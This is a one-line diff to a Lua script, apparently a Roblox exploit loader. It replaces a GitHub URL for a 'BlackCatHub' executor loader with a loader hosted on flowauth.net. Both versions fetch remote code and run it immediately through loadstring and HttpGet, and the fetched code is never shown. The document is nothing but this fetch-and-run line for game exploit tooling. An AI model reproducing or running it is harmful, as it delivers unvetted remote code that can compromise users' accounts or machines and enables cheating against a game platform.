@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pietrorrzeznik-collab/BlackCatHub-Executor-Loader/refs/heads/main/Loader.lua"))()
+loadstring(game:HttpGet("https://flowauth.net/v1/loaders/6b0a79ea7b62b8f6973375d0ce5b58de.lua"))()
